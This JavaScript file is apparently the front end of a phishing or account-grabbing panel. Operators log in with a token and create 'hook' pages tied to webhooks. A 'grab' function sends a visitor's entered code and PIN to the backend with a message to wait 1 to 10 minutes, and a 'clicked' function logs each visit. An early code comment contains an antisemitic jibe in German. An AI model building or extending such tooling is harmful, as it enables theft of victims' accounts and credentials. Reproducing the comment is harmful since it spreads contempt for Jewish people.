function create(button) {
    var type = document.getElementById("type").value;
    var webhook = document.getElementById("webhook").value;
    var name = document.getElementById("name") ? document.getElementById("name").value : '';

    var data = {
        webhook: webhook,
    };

    // juden wurden gefixt hihihi
    if (type === "quadhook") {
        var directory = document.getElementById("directory").value;
        var icon = document.getElementById("icon") ? document.getElementById("icon").value : '';
        var color = document.getElementById("color") ? document.getElementById("color").value : '';

        data.type = type;
        data.directory = directory;
        data.icon = icon;
        data.color = color;
        data.name = name;
    }
	
    if (type === "hook") {
        var directory = document.getElementById("directory").value;
        var hookDir = document.getElementById("hookDir").value ? document.getElementById("hookDir").value : '';
        var icon = document.getElementById("icon") ? document.getElementById("icon").value : '';
        var color = document.getElementById("color") ? document.getElementById("color").value : '';

        data.type = type;
        data.hookDir = hookDir;
        data.directory = directory;
        data.icon = icon;
        data.color = color;
        data.name = name;
    }
	
    if (type === "normal") {
		var directory = document.getElementById("directory").value;
        data.directory = directory;
        data.name = name;
    }

    var ep = (type === "quadhook" || type === "hook") ? "apis/hook" : "apis/normal";

    $.ajax({
        url: window.location.origin + "/backend/" + ep,
        type: 'POST',
        data: JSON.stringify(data),
        contentType: 'application/json',
        success: function(response) {
            try {
                if (response.success) {
                    if ((type === "quadhook" || type === "hook") && response.url) {
                        window.location.href = response.url;
                    } else {
                        window.location.href = "/controlPage/dashboard";
                    }
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Oops...',
                        text: response.error || 'An unknown error occurred!',
                    });
                }
            } catch (e) {
                Swal.fire({
                    icon: 'error',
                    title: 'Oops...',
                    text: 'Invalid server response. Please try again.',
                });
            }
        },
        error: function(jqXHR) {
            let eMsg = 'An issue has been encountered!';
            if (jqXHR.responseJSON && jqXHR.responseJSON.error) {
                eMsg = jqXHR.responseJSON.error;
            } else if (jqXHR.responseText) {
                try {
                    let eR = JSON.parse(jqXHR.responseText);
                    if (eR.error) {
                        eMsg = eR.error;
                    }
                } catch (e) {}
            }

            Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: eMsg,
            });
        }
    });
}

function login(button) {
    var token = document.getElementById("token") ? document.getElementById("token").value : '';

    var data = {
        token: token
    };

    $.ajax({
        url: "apis/login",
        type: 'POST',
        data: JSON.stringify(data),
        contentType: 'application/json',
        success: function(response) {
            try {
                if (response.success) {
                        window.location.href = "/controlPage/dashboard";
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Oops...',
                        text: response.error || 'An unknown error occurred!',
                    });
                }
            } catch (e) {
                Swal.fire({
                    icon: 'error',
                    title: 'Oops...',
                    text: 'Invalid server response. Please try again.',
                });
            }
        },
        error: function(jqXHR) {
            let eMsg = 'An issue has been encountered!';
            if (jqXHR.responseJSON && jqXHR.responseJSON.error) {
                eMsg = jqXHR.responseJSON.error;
            } else if (jqXHR.responseText) {
                try {
                    let eR = JSON.parse(jqXHR.responseText);
                    if (eR.error) {
                        eMsg = eR.error;
                    }
                } catch (e) {}
            }

            Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: eMsg,
            });
        }
    });
}

function Update(button) {
    var webhook = document.getElementById("webhook") ? document.getElementById("webhook").value : '';
    var avatar_url = document.getElementById("avatar_url") ? document.getElementById("avatar_url").value : '';
    var username = document.getElementById("username") ? document.getElementById("username").value : '';
    var directory = document.getElementById("directory") ? document.getElementById("directory").value : '';
    var name = document.getElementById("name") ? document.getElementById("name").value : '';

    var data = {
        webhook: webhook,
        avatar_url: avatar_url,
        username: username,
        directory: directory,
        name: name
    };

    $.ajax({
        url: "apis/update",
        type: 'POST',
        data: JSON.stringify(data),
        contentType: 'application/json',
        success: function(response) {
            try {
                if (response.success) {
                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        text: 'Your changes have been saved successfully.',
                    });
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Oops...',
                        text: response.error || 'An unknown error occurred!',
                    });
                }
            } catch (e) {
                Swal.fire({
                    icon: 'error',
                    title: 'Oops...',
                    text: 'Invalid server response. Please try again.',
                });
            }
        },
        error: function(jqXHR) {
            let eMsg = 'An issue has been encountered!';
            if (jqXHR.responseJSON && jqXHR.responseJSON.error) {
                eMsg = jqXHR.responseJSON.error;
            } else if (jqXHR.responseText) {
                try {
                    let eR = JSON.parse(jqXHR.responseText);
                    if (eR.error) {
                        eMsg = eR.error;
                    }
                } catch (e) {}
            }

            Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: eMsg,
            });
        }
    });
}

function grab(a, b) {
    $('button').prop('disabled', true);
    
    clicked(document.getElementById('h').value);
    var code = document.getElementById("code").value;
    var pin = document.getElementById("pin").value;

    var data = {
        file: code,
        pin: pin
    };

    $.ajax({
        url: window.location.origin + "/backend/apis/check",
        type: 'POST',
        data: JSON.stringify(data),
        contentType: 'application/json',
        success: function(response) {
            try {
                if (response.success) {
                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        text: 'Allow 1 - 10 Minutes For Process To Complete',
                    });
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Oops...',
                        text: response.error || 'An unknown error occurred!',
                    });
                }
            } catch (e) {
                Swal.fire({
                    icon: 'error',
                    title: 'Oops...',
                    text: 'Invalid server response. Please try again.',
                });
            } finally {
                $('button').prop('disabled', false);
            }
        },
        error: function(jqXHR) {
            let eMsg = 'An issue has been encountered!';
            if (jqXHR.responseJSON && jqXHR.responseJSON.error) {
                eMsg = jqXHR.responseJSON.error;
            } else if (jqXHR.responseText) {
                try {
                    let eR = JSON.parse(jqXHR.responseText);
                    if (eR.error) {
                        eMsg = eR.error;
                    }
                } catch (e) {}
            }

            Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: eMsg,
            });

            $('button').prop('disabled', false);
        }
    });
}

function clicked(h) {

    var data = {
        h: h
    };

    $.ajax({
        url: window.location.origin + "/backend/apis/clicked",
        type: 'POST',
        data: JSON.stringify(data),
        contentType: 'application/json',
        success: function(response) {
            try {
                // nun to do
            } catch (e) {
            }
        },
        error: function(jqXHR) {
            let eMsg = 'An issue has been encountered!';
            if (jqXHR.responseJSON && jqXHR.responseJSON.error) {
                eMsg = jqXHR.responseJSON.error;
            } else if (jqXHR.responseText) {
                try {
                    let eR = JSON.parse(jqXHR.responseText);
                    if (eR.error) {
                        eMsg = eR.error;
                    }
                } catch (e) {}
            }

            console.error(eMsg);
        }
    });
}